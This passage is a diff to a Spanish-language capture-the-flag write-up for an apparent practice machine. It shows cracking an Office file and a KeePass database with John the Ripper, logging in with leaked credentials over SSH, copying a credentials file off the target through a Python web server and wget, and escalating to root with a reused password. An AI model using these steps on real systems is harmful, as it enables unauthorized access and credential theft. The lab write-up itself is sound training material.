@@ -277,7 +277,138 @@ sudo apt install --reinstall libreoffice
 Una vez echo esto, si intentamos abrir el archivo veremos lo siguiente:
 ```html
 libreoffice backup.xlsx
+```
+<img width="353" height="162" alt="image" src="https://github.com/user-attachments/assets/b6d64b43-73c0-4c4a-a2f9-13e27c27ba19" />
 
-<img width="353" height="162" alt="image" src="https://github.com/user-attachments/assets/e2351ef6-9a12-4f4a-ae8f-14d4985e02f8" />
+Veremos que tiene contraseña, por lo que vamos a intentar crackerla con john.
 
+# Crackeo XLSX
+```ruby
+office2john backup.xlsx > hash.xlsx
+```
+Ahora con dicho hash probaremos a crackeralo para extraer la contraseña.
+```ruby
+Using default input encoding: UTF-8
+Loaded 1 password hash (Office, 2007/2010/2013 [SHA1 128/128 AVX 4x / SHA512 128/128 AVX 2x AES])
+Cost 1 (MS Office version) is 2007 for all loaded hashes
+Cost 2 (iteration count) is 50000 for all loaded hashes
+Will run 8 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+password88       (backup.xlsx)     
+1g 0:00:00:05 DONE (2025-05-09 05:25) 0.1814g/s 3095p/s 3095c/s 3095C/s princez..mia305
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+```
+Veremos que hemos sacado la password de dicho archivo, por lo que vamos a probarlo.
+
+```ruby
+breoffice backup.xlsx
+```
+Metemos como contraseña `password88` y veremos que ahora si nos deja entrar:
+<img width="700" height="518" alt="image" src="https://github.com/user-attachments/assets/bb8de117-2e0b-4776-9f18-3e3423776aea" />
+
+Vemos que es una DDBB de usuarios, contraseñas, etc... De una empresa de logistica, por lo que vamos a probar alguna de ellas para probarlas en el `login`.
+```ruby
+User: prudencia.de.ferrera
+Pass: )4UJM)JGab
+```
+Veremos que si nos ha dejado entrar con dicho usuario:
+<img width="698" height="358" alt="image" src="https://github.com/user-attachments/assets/4626fe30-4bb9-4adc-bc5a-275960d0a2a4" />
+
+Si abrimos el menu de haburguesa veremos con este usuario la opcion Bandeja de entrada, pero si entramos con otro usuario no lo veremos, por lo que tendremos que entrar con este usuario y si entramos en dicha opcion, veremos lo siguiente:
+```ruby
+
+Bandeja de entrada
+Mensaje del Administrador
+
+Usuario: prudencia.de.ferrera
+
+Credenciales SSH:
+
+            Usuario: prudencia-de-ferrera
+            Contraseña: PuT3r3stA#SH
+            Host: 192.168.1.100
+            Puerto: 22
+            
+
+Por favor, conéctate al servidor y revisa el estado del sistema de logística para resolver cualquier incidencia.
+```
+
+Vemos que nos estan proporcionando unas credenciales para conectarnos por SSH para arreglar alguna cosa del servidor, por lo que vamos a probar a conectarnos.
+
+# SHH     
+```ruby
+ssh prudencia-de-ferrera@<IP>
+```
+Metemos como contraseña PuT3r3stA#SH y veremos que estaremos dentro por lo que leeremos la flag del usuario.
+
+    user.txt
+```ruby
+a303ce44f50628e5511aca3538d11f3e
+```
+
+# Escalate Privileges
+
+Vamos a filtrar a ver que archivos se han creado como el usuario root de las ultimas fechas en la ruta /etc.
+
+```ruby
+find /etc -type f -user root -exec stat --format '%Y :%y %n' {} + 2>/dev/null | sort -nr | head
+
+1746781317 :2025-05-09 11:01:57.620468091 +0200 /etc/hosts
+1746781316 :2025-05-09 11:01:56.807770047 +0200 /etc/hostname
+1746781316 :2025-05-09 11:01:56.803787399 +0200 /etc/resolv.conf
+1746718769 :2025-05-08 17:39:29.000000000 +0200 /etc/keepass/credentialsDatabase.kdb
+1746718711 :2025-05-08 17:38:31.000000000 +0200 /etc/shadow
+1746715965 :2025-05-08 16:52:45.000000000 +0200 /etc/subuid
+1746715965 :2025-05-08 16:52:45.000000000 +0200 /etc/subgid
+1746715965 :2025-05-08 16:52:45.000000000 +0200 /etc/passwd
+1746715965 :2025-05-08 16:52:45.000000000 +0200 /etc/gshadow
+1746715965 :2025-05-08 16:52:45.000000000 +0200 /etc/group
+```
+Vemos un archivo bastante interesante que es el siguiente:
+
+```ruby
+/etc/keepass/credentialsDatabase.kdb
+```
+
+Vemos que es un archivo de credenciales en keepass, vamos a pasarnoslo a nuestra maquina host para intentar crackear la contraseña maestra de dicho archivo.
+
+```ruby
+python3 -m http.server
+```
+Ahora desde la maquina host vamos a descargar dicho archivo.
+```ruby
+wget http://<IP>:8000/credentialsDatabase.kdb
+```
+Ahora vamos a intentar crackearlo.
+
+# Crackeo de KeePass
+
+```ruby
+keepass2john credentialsDatabase.kdb > hash.keepass
+
+Using default input encoding: UTF-8
+Loaded 1 password hash (KeePass [SHA256 AES 32/64])
+Cost 1 (iteration count) is 600000 for all loaded hashes
+Cost 2 (version) is 1 for all loaded hashes
+Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
+Will run 8 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+EMINEM           (credentialsDatabase.kdb)     
+1g 0:00:02:46 DONE (2025-05-09 05:45) 0.006006g/s 47.66p/s 47.66c/s 47.66C/s jeannette..melania
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+john --wordlist=<WORDLIST> hash.keepass
+```
+<img width="762" height="273" alt="image" src="https://github.com/user-attachments/assets/dd4faddc-301b-43ac-a22b-64be45a0b697" />
+
+Veremos credenciales, pero los usuarios no coinciden con ninguno del sistema, por lo que vamos a probar a meter la primera contraseña del primer usuario por si fuera la misma que la de `root`.
+
+```ruby
+su root
+```
+Metemos como contraseña `RMeEdDPKbgFWmPnQHVC8` y veremos que estaremos dentro como dicho usuario, por lo que leeremos la flag de `root`
+
+```ruby
+16ceffb6b5f596855037e8ab1718b75f
 ```
